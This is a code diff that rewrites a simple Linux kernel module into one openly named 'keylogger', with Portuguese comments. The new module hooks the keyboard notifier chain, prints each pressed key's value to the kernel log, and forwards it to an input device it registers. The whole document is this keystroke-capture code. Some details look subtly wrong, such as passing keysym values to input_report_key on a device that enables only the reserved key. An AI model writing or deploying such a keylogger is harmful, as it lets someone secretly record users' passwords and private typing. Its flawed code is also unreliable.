@@ -1,48 +1,57 @@
 #include <linux/module.h>
+#include <linux/init.h>
 #include <linux/keyboard.h>
-#include <linux/semaphore.h>
+#include <linux/input.h> 
 
 MODULE_LICENSE("GPL");
 
-static struct semaphore sem;
+static struct input_dev *input_dev;
 
-static int keyboard_notifier(struct notifier_block *nblock, unsigned long code, void *_param) {
-    
-    struct keyboard_notifier_param *param = _param;
+static int keylogger_notify(struct notifier_block *self, unsigned long event, void *data) {
+    struct keyboard_notifier_param *param = data;
 
-    if (code == KBD_KEYCODE) {
+    if (event == KBD_KEYSYM && param->down) {
+        input_report_key(input_dev, param->value, 1); // Tecla pressionada
+        input_sync(input_dev);
 
-        printk(KERN_INFO "%c", param->value);
-    
+        printk(KERN_INFO "%c\n", param->value);
     }
 
     return NOTIFY_OK;
-
 }
 
-static struct notifier_block nb = {
-
-    .notifier_call = keyboard_notifier
-
+static struct notifier_block keylogger_blk = {
+    .notifier_call = keylogger_notify
 };
 
-static int hello_init(void) {
-    
-    printk(KERN_INFO "Iniciando o módulo do kernel\n");
+static int __init keylogger_init(void) {
+    input_dev = input_allocate_device();
+    if (!input_dev) {
+        return -ENOMEM;
+    }
 
-    sema_init(&sem, 1);
-    register_keyboard_notifier(&nb);
+    input_dev->name = "keylogger";
+    set_bit(EV_KEY, input_dev->evbit);
+    set_bit(KEY_RESERVED, input_dev->keybit); // Todas as teclas são consideradas reservadas
+
+    if (input_register_device(input_dev)) {
+        input_free_device(input_dev);
+        return -ENOMEM;
+    }
+
+    register_keyboard_notifier(&keylogger_blk);
+
+    pr_info("Módulo Keylogger carregado\n");
 
     return 0;
-
 }
 
-static void hello_exit(void) {
+static void __exit keylogger_exit(void) {
+    unregister_keyboard_notifier(&keylogger_blk);
+    input_unregister_device(input_dev);
 
-    printk(KERN_INFO "Encerrando o módulo do kernel\n");
-
-    unregister_keyboard_notifier(&nb);
-
+    pr_info("Módulo Keylogger descarregado\n");
 }
-module_init(hello_init);
-module_exit(hello_exit);
+
+module_init(keylogger_init);
+module_exit(keylogger_exit);
